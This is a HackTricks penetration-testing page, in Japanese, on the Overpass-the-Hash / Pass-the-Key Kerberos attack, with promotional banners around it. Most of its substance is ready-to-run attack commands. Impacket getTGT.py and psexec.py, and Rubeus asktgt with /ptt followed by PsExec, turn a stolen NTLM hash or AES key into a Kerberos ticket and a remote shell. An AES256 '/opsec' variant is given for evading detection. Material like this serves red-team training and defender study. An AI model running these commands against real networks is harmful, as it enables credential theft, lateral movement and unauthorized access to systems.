# Over Pass the Hash/Pass the Key

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
* [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私をフォローしてください 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングトリックを共有するために、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)**攻撃は、従来のNTLMプロトコルが制限され、Kerberos認証が優先される環境向けに設計されています。この攻撃は、ユーザーのNTLMハッシュまたはAESキーを利用してKerberosチケットを取得し、ネットワーク内のリソースに不正アクセスすることを可能にします。

この攻撃を実行するためには、最初のステップとして、対象ユーザーアカウントのNTLMハッシュまたはパスワードを取得する必要があります。この情報を確保した後、アカウントのチケット発行チケット（TGT）を取得することで、攻撃者はユーザーが権限を持つサービスやマシンにアクセスできます。

このプロセスは、次のコマンドで開始できます：
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
AES256を必要とするシナリオでは、`-aesKey [AES key]`オプションを利用できます。また、取得したチケットは、smbexec.pyやwmiexec.pyなどのさまざまなツールと組み合わせて使用することができ、攻撃の範囲を広げることができます。

_PyAsn1Error_や_KDC cannot find the name_などの問題が発生した場合は、通常、Impacketライブラリを更新するか、IPアドレスの代わりにホスト名を使用して、Kerberos KDCとの互換性を確保することで解決されます。

Rubeus.exeを使用した代替コマンドシーケンスは、このテクニックの別の側面を示しています。
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
この方法は**Pass the Key**アプローチを模倣し、チケットを直接乗っ取って認証目的で利用します。TGTリクエストの開始は、デフォルトでRC4-HMACの使用を示すイベント`4768: A Kerberos authentication ticket (TGT) was requested`をトリガーし、現代のWindowsシステムではAES256が好まれます。

運用セキュリティに準拠し、AES256を使用するには、次のコマンドを適用できます:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## 参考文献

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）でゼロからヒーローまでAWSハッキングを学ぶ</strong></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れる
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
* **[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出**することで、あなたのハッキングトリックを共有してください。

</details>
